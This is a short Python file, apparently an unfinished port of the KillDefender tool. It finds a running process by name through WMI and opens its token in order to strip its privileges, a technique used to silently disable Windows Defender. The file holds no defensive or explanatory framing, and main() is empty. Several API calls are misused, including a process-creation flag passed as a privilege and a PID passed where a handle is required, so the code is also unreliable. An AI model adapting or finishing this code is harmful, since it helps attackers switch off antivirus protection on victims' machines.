# Based on Pwn1sher's KillDefender: https://github.com/pwn1sher/KillDefender
import wmi
import win32api
import win32process
import win32security


DEBUG_PROCESS = win32process.DEBUG_PROCESS
TOKEN_QUERY = win32security.TOKEN_QUERY
TOKEN_ADJUST_PRIVILEGES = win32security.TOKEN_ADJUST_PRIVILEGES
TOKEN_ALL_ACCESS = win32security.TOKEN_ALL_ACCESS
SE_PRIVILEGE_ENABLED = win32security.SE_PRIVILEGE_ENABLED

def enable_debug_privilege():
    try:
        current_process_handle = win32api.GetCurrentProcess()
        token = win32security.OpenProcessToken(current_process_handle, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY)
        #priv_val = win32security.LookupPrivilegeValue(None, DEBUG_PROCESS)
        debug_token = win32security.AdjustTokenPrivileges(token, 1, SE_PRIVILEGE_ENABLED)
        win32api.CloseHandle(debug_token)


    except Exception as e:
        print(e)

def get_all_processes():
    c = wmi.WMI(find_classes=False)
    procs = []
    for i in c.Win32_Process(["Caption", "ProcessID"]):
        procs.append(i)
    return procs

def get_procid_from_name(processname, proc_list):
    for process in proc_list:
        p_id = process.Handle
        p_val = process.wmi_property("Caption").value()
        if p_val == processname:
            return p_id
        else:
            continue

def get_pid(process_name):
    processes = get_all_processes()
    pid = get_procid_from_name(process_name, processes)
    return pid

def set_privilege_none(pid):
    token = win32security.OpenProcessToken(pid, TOKEN_ALL_ACCESS)
    win32security.AdjustTokenPrivileges(token, 1, None)
    pass

def main():
    pass

if __name__=="__main__":
    main()